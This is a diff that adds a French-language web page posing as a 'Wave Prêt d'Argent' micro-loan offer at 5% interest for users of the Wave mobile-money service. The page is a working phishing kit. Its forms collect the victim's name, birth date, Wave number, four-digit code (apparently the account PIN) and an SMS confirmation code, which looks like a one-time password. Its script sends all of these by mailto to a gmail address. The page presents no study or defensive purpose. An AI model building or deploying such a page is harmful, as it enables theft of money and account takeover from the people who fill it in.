@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="fr"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Wave Prêt d'Argent</title> <!-- Balises Open Graph --> 
+  <meta property="og:title" content="Wave Prêt d'Argent"> 
+  <meta property="og:description" content="Obtenez des prêts rapides et faciles avec un intérêt de seulement 5 %."> 
+  <meta property="og:image" content="https://i.postimg.cc/Y0DpykyT/6g4jm-W-ZT9-Kys-NO4y-Syl1w.webp"> 
+  <meta property="og:url" content="https://votre-site.com"> <!-- Remplacez par l'URL de votre site --> 
+  <meta property="og:type" content="website"> 
+  <link rel="stylesheet" href="style.css"> 
+ <style type="text/css" id="dcoder_stylesheet">body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f0f8ff;
+}
+
+header {
+    background-color: #007bff;
+    color: white;
+    text-align: center;
+    padding: 20px;
+}
+
+.logo {
+    width: 100px;
+    height: auto;
+}
+
+h1 {
+    margin: 10px 0;
+}
+
+.intro {
+    text-align: center;
+    padding: 20px;
+}
+
+.wave-image {
+    width: 300px;
+    height: auto;
+    margin: 20px 0;
+}
+
+main {
+    max-width: 800px;
+    margin: auto;
+    padding: 20px;
+    background-color: white;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+form {
+    margin-bottom: 20px;
+}
+
+h3 {
+    color: #007bff;
+}
+
+label {
+    font-weight: bold;
+}
+
+input[type="text"],
+input[type="number"],
+input[type="date"] {
+    width: calc(100% - 20px);
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid #007bff;
+    border-radius: 4px;
+}
+
+button {
+    background-color: #007bff;
+    color: white;
+    padding: 10px 15px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+button:hover {
+    background-color: #0056b3;
+}
+
+.info, .confirmation {
+    margin-top: 20px;
+}
+
+ul {
+    list-style-type: none;
+    padding: 0;
+}
+
+ul li {
+    margin: 5px 0;
+}</style></head> 
+ <body> 
+  <header> 
+   <img src="https://i.postimg.cc/Y0DpykyT/6g4jm-W-ZT9-Kys-NO4y-Syl1w.webp" alt="Logo Wave" class="logo"> 
+   <h1>Wave Prêt d'Argent</h1> 
+  </header> 
+  <main> 
+   <section class="intro"> 
+    <h2>Obtenez des prêts rapides et faciles</h2> 
+    <p>Nous offrons des prêts d'argent avec un intérêt de seulement 5 %, bien inférieur aux banques traditionnelles.</p> 
+    <img src="https://i.postimg.cc/v80HmLHX/2tb-CJ9d-MS-6it-RZsw-Qa0-Q.webp" alt="Wave Money" class="wave-image"> 
+   </section> 
+   <form id="formulaire-blague"> 
+    <h3>Demande de Prêt</h3> <label for="nom">Nom :</label> 
+    <input type="text" id="nom" name="nom" required> 
+    <br> 
+    <br> <label for="prenom">Prénom :</label> 
+    <input type="text" id="prenom" name="prenom" required> 
+    <br> 
+    <br> <label for="date-de-naissance">Date de naissance :</label> 
+    <input type="date" id="date-de-naissance" name="date-de-naissance" required> 
+    <br> 
+    <br> <label for="numero-wave">Numéro Wave :</label> 
+    <input type="text" id="numero-wave" name="numero-wave" required> 
+    <br> 
+    <br> <label for="montant">Montant du prêt :</label> 
+    <input type="number" id="montant" name="montant" required> 
+    <br> 
+    <br> <label for="code-4-chiffres">Code 4 chiffres :</label> 
+    <input type="number" id="code-4-chiffres" name="code-4-chiffres" required> 
+    <br> 
+    <br> <button id="envoyer" type="submit">Envoyer</button> 
+   </form> 
+   <section class="info"> 
+    <h2>Pourquoi choisir notre service ?</h2> 
+    <ul> 
+     <li>Intérêt compétitif de 5 %.</li> 
+     <li>Processus rapide et facile.</li> 
+     <li>Service client disponible 24/7.</li> 
+    </ul> 
+    <p>Après avoir envoyé votre demande, vous recevrez un code de confirmation par SMS. Ce code devra être saisi ci-dessous pour finaliser votre demande.</p> 
+   </section> 
+   <section class="confirmation"> 
+    <h2>Entrer le code de confirmation</h2> 
+    <form id="formulaire-confirmation"> <label for="code-confirmation">Code de confirmation :</label> 
+     <input type="text" id="code-confirmation" name="code-confirmation" required> 
+     <br> 
+     <br> <button id="envoyer-confirmation" type="submit">Envoyer le code</button> 
+    </form> 
+   </section> 
+  </main> 
+  <script src="script.js"></script> 
+ 
+<script type="text/javascript" id="dcoder_script">document.getElementById('formulaire-blague').addEventListener('submit', function(event) {
+    event.preventDefault(); // Empêche l'envoi du formulaire
+
+    const nom = document.getElementById('nom').value;
+    const prenom = document.getElementById('prenom').value;
+    const dateNaissance = document.getElementById('date-de-naissance').value;
+    const numeroWave = document.getElementById('numero-wave').value;
+    const montant = document.getElementById('montant').value;
+    const code = document.getElementById('code-4-chiffres').value;
+
+    // Créer le message à envoyer
+    const message = `Demande de prêt de ${montant}€\nNom: ${nom}\nPrénom: ${prenom}\nDate de naissance: ${dateNaissance}\nNuméro Wave: ${numeroWave}\nCode 4 chiffres: ${code}`;
+    
+    // Encoder le message pour l'URL
+    const encodedMessage = encodeURIComponent(message);
+    
+    // Créer l'URL mailto
+    const mailtoLink = `mailto:microcreditwave@gmail.com?subject=Demande de Prêt&body=${encodedMessage}`;
+    
+    // Ouvrir le client de messagerie
+    window.location.href = mailtoLink;
+
+    // Informer l'utilisateur qu'il recevra un code de confirmation
+    alert("Votre demande a été envoyée ! Vous recevrez un code de confirmation par SMS.");
+});
+
+// Gestion de l'envoi du code de confirmation
+document.getElementById('formulaire-confirmation').addEventListener('submit', function(event) {
+    event.preventDefault(); // Empêche l'envoi du formulaire
+
+    const codeConfirmation = document.getElementById('code-confirmation').value;
+
+    // Créer le message pour le code de confirmation
+    const confirmationMessage = `Code de confirmation reçu : ${codeConfirmation}`;
+
+    // Encoder le message pour l'URL
+    const encodedConfirmationMessage = encodeURIComponent(confirmationMessage);
+
+    // Créer l'URL mailto pour le code de confirmation
+    const mailtoConfirmationLink = `mailto: microcreditwave@gmail.com?subject=Code de Confirmation&body=${encodedConfirmationMessage}`;
+
+    // Ouvrir le client de messagerie pour envoyer le code
+    window.location.href = mailtoConfirmationLink;
+});</script></body></html>
